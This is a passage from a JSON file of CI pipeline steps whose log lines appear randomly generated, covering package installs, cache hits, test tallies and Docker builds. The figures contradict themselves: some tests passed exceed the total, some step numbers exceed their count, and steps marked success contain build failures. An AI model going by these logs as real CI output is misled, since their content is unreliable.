          "npm install: added 443 packages",
          "[12:19:57] INFO: Processing request",
          "Generating source maps...",
          "Tests: 86 passed, 117 total",
          "Step 4/19: Deploying",
          "Snapshots: 29 passed, 23 total",
          "NODE_ENV=production",
          "Pulling image: alpine:3.11",
          "npm install: resolved 1774 packages",
          "Compiling utils/utils.go...",
          "npm install: resolved 317 packages",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:19:57] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (36MB)",
          "Optimizing 56 modules...",
          "Using Python 3.9",
          "\u2717 build failed with exit code 16",
          "\u2713 Step 'install' succeeded",
          "[12:19:57] DEBUG: Query executed in 52ms",
          "\u2713 Task completed in 2665ms",
          "pip: Installing build dependencies...",
          "Test Suites: 18 passed, 28 total",
          "Cache restored successfully (500MB)",
          "Cache hit for key-4851",
          "POST /upload - 202 (139ms)",
          "Transforming 343 files...",
          "FAILED: test_user_create",
          "Cache saved successfully",
          "Building Docker image...",
          "Using Node.js 15.0.1",
          "Compiling utils/app.ts...",
          "[12:19:57] INFO: Cache refreshed",
          "pip install: Successfully installed react-5.4",
          "Uploading artifact 'build' (18 files)",
          "npm notice: package.json updated",
          "npm install: added 436 packages",
          "Step 4/21: Testing",
          "[12:19:57] DEBUG: Connection pool: 17 active",
          "WARNING: jest has known vulnerabilities",
          "Checking out main branch",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "Optimizing 28 modules...",
          "Waiting...",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing express@3.0.0",
          "Layer 3/8: COPY command",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-01T12:21:01.864343",
        "finished_at": "2025-12-01T12:21:09.585270",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:19:57] WARN: Deprecated API usage",
          "Done.",
          "  PASS: unit/test_api_health.spec.js",
          "Snapshots: 32 passed, 44 total",
          "yarn add: Done in 24.6s",
          "Installing webpack@2.14.6",
          "[12:19:57] INFO: Processing request",
          "TLS handshake completed",
          "\u2713 Task completed in 1156ms",
          "\u2713 validate completed",
          "Pulling image: python:18",
          "FAILED: test_user_create",
          "Creating production build...",
          "Artifact downloaded: 50MB",
          "WARNING: express has known vulnerabilities",
          "Coverage: 73% statements, 82% branches",
          "Fetching submodules...",
          "Creating production build...",
          "[12:19:57] INFO: Starting build process",
          "Snapshots: 16 passed, 9 total",
          "HEAD is now at 86b14d5",
          "pip: Installing build dependencies...",
          "[12:19:57] INFO: Processing request",
          "[12:19:57] INFO: Processing request",
          "Layer 9/9: RUN command",
          "Switched to branch 'hotfix/task-387'",
          "Creating production build...",
          "WARNING: webpack has known vulnerabilities",
          "HEAD is now at f181b22",
          "Tests: 82 passed, 112 total",
          "[12:19:57] DEBUG: Initializing service",
          "Creating production build...",
          "Waiting...",
          "Success!",
          "pip: Downloading react-4.5.tar.gz",
          "Cache restored successfully (483MB)",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:57] DEBUG: Loading configuration",
          "Layer 4/9: ENV command",
          "Already up to date.",
          "Using Python 3.11",
          "Ready.",
          "Cache restored successfully (303MB)",
          "Tests: 368 passed, 427 total",
          "Waiting...",
          "TLS handshake completed",
          "Tests: 105 passed, 441 total",
          "NODE_ENV=production",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 91% statements, 86% branches",
          "Test Suites: 19 passed, 18 total",
          "Ready.",
          "Coverage: 95% statements, 79% branches",
          "NODE_ENV=development",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 9 passed, 10 total",
          "Waiting...",
          "[12:19:57] DEBUG: Initializing service",
          "Finished.",
          "yarn add: Done in 15.37s",
          "Transforming 521 files...",
          "Switched to branch 'feature/task-618'",
          "Cache hit for key-2534",
          "Cache saved successfully",
          "Transforming 247 files...",
          "Using Node.js 19.13.9",
          "Snapshots: 41 passed, 39 total",
          "Cache miss for key-1559",
          "Snapshots: 5 passed, 14 total",
          "[12:19:57] DEBUG: Query executed in 87ms",
          "[12:19:57] INFO: Starting build process",
          "Building Docker image...",
          "Building Docker image...",
          "[12:19:57] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Ran 92 tests in 50s",
          "Artifact uploaded: dist.zip (56MB)",
          "Cache saved successfully",
          "Step 9/25: Testing",
          "Minifying app.js",
          "Exception: TypeError",
          "\u2713 Step 'test' succeeded",
          "[12:19:57] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Completed.",
          "Pushing to registry...",
          "Verifying...",
          "pip install: Successfully installed lodash-5.4",
          "Already up to date.",
          "GET /api - 201 (71ms)",
          "Using Python 3.11",
          "Verifying...",
          "Compiling lib/service.java...",
          "Building Docker image...",
          "[12:19:57] ERROR: Connection failed",
          "Artifact downloaded: 24MB",
          "Fetching submodules...",
          "Processing...",
          "Connection established",
          "Installing lodash@2.18.10",
          "[12:19:57] DEBUG: Connection pool: 15 active",
          "npm install: resolved 133 packages",
          "Step 10/21: Deploying",
          "Cache restored successfully (430MB)",
          "[12:19:57] WARN: Deprecated API usage",
          "Completed.",
          "[12:19:57] INFO: Cache refreshed",
          "[12:19:57] DEBUG: Initializing service",
          "Building Docker image...",
          "Ran 148 tests in 14s",
          "[12:19:57] INFO: Processing request",
          "Success!",
          "TLS handshake completed",
          "Creating production build...",
          "Installing lodash@4.11.0",
          "Time: 117.66s",
          "[12:19:57] INFO: Processing request",
          "POST /data - 202 (373ms)",
          "[12:19:57] DEBUG: Loading configuration",
          "  PASS: integration/test_user_create.spec.js",
          "Installing webpack@5.6.8",
          "Test Suites: 12 passed, 12 total",
          "Transforming 177 files...",
          "Cache miss for key-5232",
          "pip install: Successfully installed prettier-1.9",
          "[12:19:57] DEBUG: Initializing service",
          "Cache invalidated: node_modules",
          "Uploading artifact 'dist' (46 files)",
          "Step 11/25: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "Step 20/19: Testing",
          "pip: Installing build dependencies...",
          "Success!",
          "\u2713 lint completed",
          "pip install: Successfully installed webpack-5.5",
          "Transforming 747 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:57] WARN: Deprecated API usage",
          "pip: Collecting eslint",
          "Already up to date.",
          "npm install: added 333 packages",
          "Tests: 129 passed, 172 total",
          "\u2717 build failed with exit code 47",
          "Cache restored successfully (27MB)",
          "[12:19:57] INFO: Starting build process",
          "HEAD is now at 1a37364",
          "Optimizing 42 modules...",
          "Installing axios@1.19.3",
          "Verifying...",
          "Creating production build...",
          "[12:19:57] DEBUG: Memory usage: 451MB",
          "NODE_ENV=development",
          "[12:19:57] DEBUG: Connection pool: 13 active",
          "\u2713 Task completed in 2211ms",
          "Done.",
          "Test Suites: 48 passed, 47 total",
          "Compiling src/app.ts...",
          "[12:19:57] INFO: Cache refreshed",
          "Tests: 144 passed, 127 total",
          "Cache restored successfully (319MB)",
          "Layer 7/14: RUN command",
          "pip install: Successfully installed eslint-3.11",
          "Ran 10 tests in 52s",
          "Step 10/23: Deploying",
          "Image pulled successfully",
          "[12:19:57] DEBUG: Connection pool: 11 active",
          "Step 19/22: Running migrations",
          "[12:19:57] DEBUG: Loading configuration",
          "[12:19:57] INFO: Starting build process",
          "[12:19:57] INFO: Connecting to database",
          "Checking out master branch",
          "Bundling main.js",
          "Tests: 491 passed, 178 total",
          "Cache restored successfully (71MB)",
          "Creating production build...",
          "[12:19:57] WARN: Deprecated API usage",
          "Processing...",
          "Switched to branch 'feature/task-715'",
          "TLS handshake completed",
          "Processing...",
          "Cache miss for key-9534",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (19MB)",
          "POST /upload - 200 (366ms)",
          "Finished.",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-01T12:21:09.585270",
        "finished_at": "2025-12-01T12:21:17.306197",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Completed.",
          "npm notice: created a lockfile",
          "Layer 5/9: RUN command",
          "pip: Installing build dependencies...",
          "pip: Downloading express-4.3.tar.gz",
          "Coverage: 85% statements, 61% branches",
          "[12:19:57] DEBUG: Connection pool: 10 active",
          "Success!",
          "Building Docker image...",
          "Cache restored successfully (221MB)",
          "Step 11/21: Building",
          "Artifact uploaded: dist.zip (8MB)",
          "Installing express@3.2.8",
          "Cache saved successfully",
          "Verifying...",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: production",
          "Optimizing 33 modules...",
          "Optimizing 31 modules...",
          "[12:19:57] WARN: Deprecated API usage",
          "Step 6/23: Building",
          "yarn add: Done in 14.1s",
          "pip: Collecting lodash",
          "[12:19:57] DEBUG: Connection pool: 14 active",
          "\u2713 Task completed in 2537ms",
          "[12:19:57] INFO: Connecting to database",
          "  PASS: test_db_connect (170ms)",
          "Compiling components/utils.go...",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 17/16: Deploying",
          "yarn add: Done in 8.93s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "TLS handshake completed",
          "OK",
          "Connection established",
          "Verifying...",
          "[12:19:57] DEBUG: Initializing service",
          "Installing eslint@2.8.6",
          "Artifact downloaded: 41MB",
          "\u2713 Step 'test' succeeded",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Pushing to registry...",
          "Snapshots: 6 passed, 42 total",
          "Ready.",
          "[12:19:57] WARN: Deprecated API usage",
          "pip: Downloading axios-2.15.tar.gz",
          "Artifact uploaded: dist.zip (5MB)",
          "Artifact downloaded: 32MB",
          "[12:19:57] DEBUG: Initializing service",
          "Generating source maps...",
          "Minifying main.js",
          "Using Python 3.11",
          "Creating production build...",
          "pip install: Successfully installed express-1.0",
          "NODE_ENV=development",
          "[12:19:57] INFO: Processing request",
          "Pulling image: alpine:latest",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "Platform: linux-x64",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Coverage: 92% statements, 67% branches",
          "TLS handshake completed",
          "Compiling src/app.ts...",
          "Tests: 410 passed, 223 total",
          "Compiling utils/service.java...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Ready.",
          "Waiting...",
          "Step 3/19: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting jest",
          "Snapshots: 39 passed, 12 total",
          "Fetching submodules...",
          "npm install: added 31 packages",
          "npm notice: package.json updated",
          "Test Suites: 8 passed, 7 total",
          "pip: Installing build dependencies...",
          "\u2713 build completed",
          "[12:19:57] INFO: Connecting to database",
          "Completed.",
          "pip: Downloading jest-3.17.tar.gz",
          "pip: Downloading lodash-3.5.tar.gz",
          "WARNING: lodash has known vulnerabilities",
          "\u2717 build failed with exit code 40",
          "[12:19:57] DEBUG: Initializing service",
          "[12:19:57] DEBUG: Query executed in 36ms",
          "[12:19:57] DEBUG: Initializing service",
          "Loading...",
          "[12:19:57] INFO: Cache refreshed",
          "Loading...",
          "pip install: Successfully installed eslint-1.18",
          "WARNING: jest has known vulnerabilities",
          "\u2713 All checks passed",
          "Switched to branch 'feature/task-112'",
          "Minifying main.js",
          "Installing jest@3.10.5",
          "npm install: resolved 304 packages",
          "[12:19:57] DEBUG: Connection pool: 16 active",
          "Cache miss for key-7771",
          "[12:19:57] DEBUG: Memory usage: 657MB",
          "Switched to branch 'feature/task-833'",
          "Verifying...",
          "  PASS: integration/test_user_create.spec.js",
          "Compiling components/main.py...",
          "\u2713 All checks passed",
          "Done.",
          "Optimizing 52 modules...",
          "npm notice: package.json updated",
          "Uploading artifact 'coverage' (39 files)",
          "Cache miss for key-1912",
          "Step 9/15: Testing",
          "HEAD is now at 4893a25",
          "[12:19:57] DEBUG: Initializing service",
          "HEAD is now at 951a47d",
          "Compiling utils/index.js...",
          "Creating production build...",
          "FAILED: test_api_health",
          "Step 1/16: Testing",
          "Uploading artifact 'build' (42 files)",
          "Success!",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache restored successfully (41MB)",
          "[12:19:57] DEBUG: Initializing service",
          "npm install: added 488 packages",
          "[12:19:57] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /health - 204 (64ms)",
          "pip: Collecting lodash",
          "OK",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Success!",
          "Platform: win32-x64",
          "TLS handshake completed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ran 33 tests in 29s",
          "Step 3/17: Testing",
          "Already up to date.",
          "Time: 36.765s",
          "Cache invalidated: node_modules",
          "Platform: darwin-arm64",
          "npm install: added 163 packages",
          "Ran 106 tests in 24s",
          "Cache restored successfully (34MB)",
          "[12:19:57] DEBUG: Loading configuration",
          "Platform: darwin-arm64",
          "Already up to date.",
          "Step 8/15: Linting",
          "Compiling components/utils.go...",
          "OK",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: dist.zip (68MB)",
          "Cache hit for key-3478",
          "Cache invalidated: dependencies",
          "TLS handshake completed",
          "Coverage: 92% statements, 88% branches",
          "[12:19:57] INFO: Starting build process",
          "Finished.",
          "Tests: 61 passed, 63 total",
          "Image pulled successfully",
          "Transforming 523 files...",
          "Cache restored successfully (471MB)",
          "[12:19:57] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 20",
          "Using Python 3.9",
          "[12:19:57] DEBUG: Memory usage: 1395MB",
          "Connection established",
          "Platform: linux-x64",
          "Step 19/16: Running migrations",
          "Cache hit for key-1238",
          "Ran 173 tests in 18s",
          "Cache miss for key-4887",
          "Building Docker image...",
          "GET /api - 200 (56ms)",
          "Completed.",
          "[12:19:57] INFO: Starting build process",
          "Verifying...",
          "[12:19:57] DEBUG: Loading configuration",
          "Using Node.js 17.20.10",
          "[12:19:57] WARN: Deprecated API usage",
          "Minifying vendor.js",
          "Transforming 289 files...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-01T12:21:17.306197",
        "finished_at": "2025-12-01T12:21:32.748051",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Verifying...",
          "Using Node.js 18.15.8",
          "\u2713 build completed",
          "[12:19:57] DEBUG: Query executed in 79ms",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.9",
          "Compiling components/index.js...",
          "HEAD is now at 7706b89",
          "\u2713 Task completed in 485ms",
          "[12:19:57] INFO: Request completed",
          "npm notice: package.json updated",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/index.js...",
          "[12:19:57] INFO: Processing request",
          "Bundling vendor.js",
          "WARNING: express has known vulnerabilities",
          "[12:19:57] WARN: Deprecated API usage",
          "Compiling lib/handler.rs...",
          "Step 3/16: Building",
          "Step 3/25: Building",
          "Image pulled successfully",
          "Done.",
          "Artifact uploaded: dist.zip (85MB)",
          "Cache invalidated: node_modules",
          "Transforming 846 files...",
          "Artifact uploaded: dist.zip (45MB)",
          "GET /status - 204 (6ms)",
          "pip: Collecting express",
          "Cache miss for key-5513",
          "NODE_ENV=development",
          "Optimizing 52 modules...",
          "pip: Collecting react",
          "npm install: added 281 packages",
          "Step 3/16: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Uploading artifact 'coverage' (25 files)",
          "NODE_ENV=development",
          "Using Node.js 20.13.9",
          "Step 8/16: Building",
          "pip: Collecting react",
          "Step 15/20: Linting",
          "\u2713 All checks passed",
          "Switched to branch 'feature/task-422'",
          "Artifact uploaded: dist.zip (51MB)",
          "OK",
          "Bundling main.css",
          "\u2713 Task completed in 981ms",
          "pip: Installing build dependencies...",
          "Step 1/23: Running migrations",
          "TLS handshake completed",
          "Compiling components/main.py...",
          "Pulling image: node:3.11",
          "[12:19:57] DEBUG: Initializing service",
          "Building Docker image...",
          "pip install: Successfully installed react-5.3",
          "Compiling src/handler.rs...",
          "\u2713 Task completed in 2050ms",
          "HEAD is now at 6765ab9",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 12.39s",
          "Connection established",
          "Fetching submodules...",
          "Pushing to registry...",
          "[12:19:57] WARN: Deprecated API usage",
          "Ready.",
          "Loading...",
          "Cache invalidated: dependencies",
          "Pulling image: python:3.11",
          "Artifact downloaded: 43MB",
          "NODE_ENV=development",
          "[12:19:57] INFO: Connecting to database",
          "[12:19:57] WARN: Deprecated API usage",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "npm install: added 36 packages",
          "Done.",
          "Optimizing 48 modules...",
          "Verifying...",
          "  PASS: unit/test_api_health.spec.js",
          "[12:19:57] INFO: Processing request",
          "Environment: production",
          "pip: Downloading webpack-2.19.tar.gz",
          "Compiling src/main.py...",
          "FAILED: test_db_connect",
          "Cache restored successfully (175MB)",
          "Uploading artifact 'build' (15 files)",
          "npm install: added 243 packages",
          "Optimizing 22 modules...",
          "Creating production build...",
          "Cache saved successfully",
          "OK",
          "Step 17/20: Running migrations",
          "[12:19:57] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Image pulled successfully",
          "[12:19:57] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Node.js 18.6.7",
          "Compiling components/service.java...",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Step 15/25: Testing",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "pip install: Successfully installed lodash-4.17",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Uploading artifact 'coverage' (15 files)",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Processing...",
          "Fetching submodules...",
          "pip: Downloading eslint-5.1.tar.gz",
          "pip install: Successfully installed jest-2.5",
          "\u2713 Task completed in 1736ms",
          "Cache saved successfully",
          "Already up to date.",
          "Tests: 113 passed, 453 total",
          "Image pulled successfully",
          "Pushing to registry...",
          "[12:19:57] DEBUG: Initializing service",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 4/22: Building",
          "OK",
          "WARNING: prettier has known vulnerabilities",
          "Finished.",
          "[12:19:57] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:57] INFO: Starting build process",
          "  PASS: test_user_create (12ms)",
          "Step 10/25: Testing",
          "Snapshots: 19 passed, 43 total",
          "HEAD is now at a83c502",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache hit for key-2118",
          "Step 11/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:57] WARN: Deprecated API usage",
          "Creating production build...",
          "Checking out master branch",
          "[12:19:57] DEBUG: Connection pool: 11 active",
          "Step 16/24: Running migrations",
          "Cache saved successfully",
          "yarn add: Done in 30.60s",
          "[12:19:57] DEBUG: Connection pool: 7 active",
          "Compiling lib/main.py...",
          "Image pulled successfully",
          "Already up to date.",
          "Step 6/20: Deploying",
          "pip: Downloading webpack-1.8.tar.gz",
          "[12:19:57] INFO: Connecting to database",
          "Using Python 3.12",
          "Layer 3/15: ENV command",
          "GET /health - 200 (12ms)",
          "Step 10/21: Running migrations",
          "Checking out master branch",
          "pip: Collecting express",
          "Cache hit for key-7456",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Image pulled successfully",
          "Transforming 347 files...",
          "[12:19:57] INFO: Request completed",
          "\u2713 Step 'test' succeeded",
          "\u2713 Task completed in 219ms",
          "Done.",
          "Ran 19 tests in 60s",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Loading...",
          "Fetching submodules...",
          "Connection established",
          "Cache restored successfully (274MB)",
          "Connecting to test.io:443...",
          "pip install: Successfully installed express-3.13",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 554ms",
          "Compiling lib/index.js...",
          "Uploading artifact 'coverage' (17 files)",
          "Verifying...",
          "Cache miss for key-6947",
          "Pushing to registry...",
          "HEAD is now at e502896",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-01T12:21:32.748051",
        "finished_at": "2025-12-01T12:21:55.910833",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Uploading artifact 'dist' (1 files)",
          "WARNING: prettier has known vulnerabilities",
          "Building Docker image...",
          "Step 10/24: Running migrations",
          "WARNING: express has known vulnerabilities",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "Pulling image: python:latest",
          "Optimizing 22 modules...",
          "Exception: ValueError",
          "\u2713 deploy completed",
          "npm install: added 137 packages",
          "Layer 4/13: COPY command",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:19:57] INFO: Cache refreshed",
          "Compiling lib/utils.go...",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Ran 193 tests in 49s",
          "pip: Collecting react",
          "Test Suites: 32 passed, 45 total",
          "Ran 59 tests in 51s",
          "Optimizing 85 modules...",
          "Step 8/20: Building",
          "Loading...",
          "Optimizing 23 modules...",
          "pip: Installing build dependencies...",
          "Time: 72.38s",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Ready.",
          "HEAD is now at 8da9fcf",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (73MB)",
          "yarn add: Done in 18.94s",
          "[12:19:57] ERROR: Connection failed",
          "Building Docker image...",
          "npm install: added 283 packages",
          "Switched to branch 'hotfix/task-758'",
          "\u2713 All checks passed",
          "Snapshots: 36 passed, 45 total",
          "Step 3/18: Deploying",
          "Cache saved successfully",
          "[12:19:57] DEBUG: Query executed in 12ms",
          "Environment: test",
          "Step 4/21: Installing dependencies",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "[12:19:57] DEBUG: Query executed in 5ms",
          "Ready.",
          "Already up to date.",
          "\u2713 Task completed in 3875ms",
          "Tests: 88 passed, 179 total",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache miss for key-6862",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "pip: Downloading eslint-1.13.tar.gz",
          "Optimizing 38 modules...",
          "TLS handshake completed",
          "Ready.",
          "yarn add: Done in 22.13s",
          "Cache miss for key-2834",
          "Step 16/18: Running migrations",
          "  PASS: test_api_health (68ms)",
          "Installing eslint@3.0.9",
          "Step 1/17: Testing",
          "Verifying...",
          "Verifying...",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:19:57] ERROR: Connection failed",
          "pip: Collecting webpack",
          "Verifying...",
          "[12:19:57] INFO: Connecting to database",
          "Platform: linux-x64",
          "Using Node.js 18.14.6",
          "Done.",
          "npm notice: created a lockfile",
          "[12:19:57] ERROR: Connection failed",
          "npm notice: package.json updated",
          "Waiting...",
          "Cache miss for key-9990",
          "Snapshots: 28 passed, 47 total",
          "Connecting to acme.corp:443...",
          "pip install: Successfully installed prettier-1.8",
          "Switched to branch 'hotfix/task-809'",
          "Processing...",
          "Optimizing 38 modules...",
          "Step 2/17: Deploying",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "[12:19:57] ERROR: Connection failed",
          "[12:19:57] ERROR: Connection failed",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache miss for key-4911",
          "[12:19:57] DEBUG: Query executed in 51ms",
          "Checking out master branch",
          "yarn add: Done in 28.35s",
          "Time: 76.67s",
          "yarn add: Done in 19.38s",
          "\u2713 build completed",
          "Creating production build...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache restored successfully (172MB)",
          "WARNING: express has known vulnerabilities",
          "Step 5/19: Installing dependencies",
          "Artifact downloaded: 16MB",
          "Switched to branch 'feature/task-448'",
          "GET /api - 204 (57ms)",
          "yarn add: Done in 26.27s",
          "[12:19:57] ERROR: Connection failed",
          "Cache invalidated: node_modules",
          "Cache miss for key-3380",
          "Processing...",
          "Verifying...",
          "Building Docker image...",
          "Switched to branch 'feature/task-739'",
          "Compiling lib/utils.go...",
          "Building Docker image...",
          "[12:19:57] DEBUG: Memory usage: 1780MB",
          "Cache restored successfully (172MB)",
          "pip install: Successfully installed react-3.2",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 247 packages",
          "\u2713 Step 'setup' succeeded",
          "Step 6/18: Deploying",
          "\u2717 build failed with exit code 66",
          "Transforming 106 files...",
          "Coverage: 77% statements, 69% branches",
          "Already up to date.",
          "Tests: 178 passed, 402 total",
          "Verifying...",
          "POST /api - 201 (311ms)",
          "Test Suites: 23 passed, 41 total",
          "[12:19:57] WARN: Deprecated API usage",
          "[12:19:57] DEBUG: Query executed in 96ms",
          "pip: Collecting lodash",
          "Step 10/15: Testing",
          "Platform: linux-x64",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "npm install: added 297 packages",
          "[12:19:57] INFO: Starting build process",
          "Image pulled successfully",
          "Using Node.js 19.19.4",
          "npm notice: package.json updated",
          "Cache hit for key-6164",
          "  PASS: test_api_health (56ms)",
          "[12:19:57] DEBUG: Loading configuration",
          "Bundling main.js",
          "Processing...",
          "OK",
          "Tests: 332 passed, 375 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "OK",
          "Step 7/24: Building",
          "Test Suites: 32 passed, 40 total",
          "[12:19:57] INFO: Starting build process",
          "[12:19:57] WARN: Deprecated API usage",
          "Tests: 158 passed, 185 total",
          "Step 8/17: Installing dependencies",
          "Layer 6/15: ENV command",
          "Artifact uploaded: dist.zip (18MB)",
          "Using Python 3.9",
          "Step 4/18: Deploying",
          "[12:19:57] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "Compiling utils/handler.rs...",
          "Compiling lib/app.ts...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "yarn add: Done in 12.99s",
          "[12:19:57] INFO: Cache refreshed",
          "Artifact downloaded: 41MB",
          "Cache miss for key-1414",
          "pip install: Successfully installed eslint-1.10",
          "Layer 4/11: ENV command",
          "pip install: Successfully installed express-5.3",
          "[12:19:57] INFO: Cache refreshed",
          "Time: 65.461s",
          "  PASS: test_cache_hit (259ms)",
          "Completed.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-01T12:21:55.910833",
        "finished_at": "2025-12-01T12:22:03.631760",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:19:57] DEBUG: Connection pool: 4 active",
          "[12:19:57] INFO: Starting build process",
          "pip: Downloading express-1.12.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-6273",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "Cache saved successfully",
          "Exception: NullPointerException",
          "npm notice: created a lockfile",
          "HEAD is now at 0b5e8cd",
          "[12:19:57] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Layer 4/11: COPY command",
          "GET /health - 200 (2ms)",
          "Using Python 3.9",
          "Uploading artifact 'coverage' (20 files)",
          "Creating production build...",
          "Step 13/21: Linting",
          "Step 6/21: Linting",
          "NODE_ENV=development",
          "Generating source maps...",
          "POST /upload - 201 (12ms)",
          "NODE_ENV=test",
          "npm notice: package.json updated",
          "Switched to branch 'bugfix/task-253'",
          "[12:19:57] DEBUG: Memory usage: 902MB",
          "Step 19/20: Installing dependencies",
          "Compiling lib/app.ts...",
          "FAILED: test_cache_hit",
          "\u2717 build failed with exit code 127",
          "npm notice: package.json updated",
          "Compiling utils/main.py...",
          "[12:19:57] INFO: Request completed",
          "Fetching submodules...",
          "Cache invalidated: dependencies",
          "Processing...",
          "Bundling vendor.js",
          "[12:19:57] DEBUG: Query executed in 29ms",
          "npm install: resolved 1614 packages",
          "[12:19:57] DEBUG: Memory usage: 1099MB",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 20.19.3",
          "npm notice: created a lockfile",
          "  PASS: test_user_create (86ms)",
          "\u2713 Task completed in 2769ms",
          "Exception: NullPointerException",
          "[12:19:57] DEBUG: Loading configuration",
          "Test Suites: 18 passed, 36 total",
          "[12:19:57] DEBUG: Connection pool: 12 active",
          "Artifact uploaded: dist.zip (59MB)",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Step 20/15: Installing dependencies",
          "Using Node.js 20.9.8",
          "Bundling runtime.js",
          "[12:19:57] DEBUG: Initializing service",
          "Transforming 248 files...",
          "Step 19/15: Deploying",
          "[12:19:57] INFO: Processing request",
          "Pushing to registry...",
          "[12:19:57] INFO: Starting build process",
          "TLS handshake completed",
          "npm install: resolved 591 packages",
          "Minifying main.js",
          "Step 4/25: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 12",
          "Done.",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:57] DEBUG: Query executed in 10ms",
          "Coverage: 83% statements, 68% branches",
          "POST /data - 200 (18ms)",
          "[12:19:57] DEBUG: Loading configuration",
          "Building Docker image...",
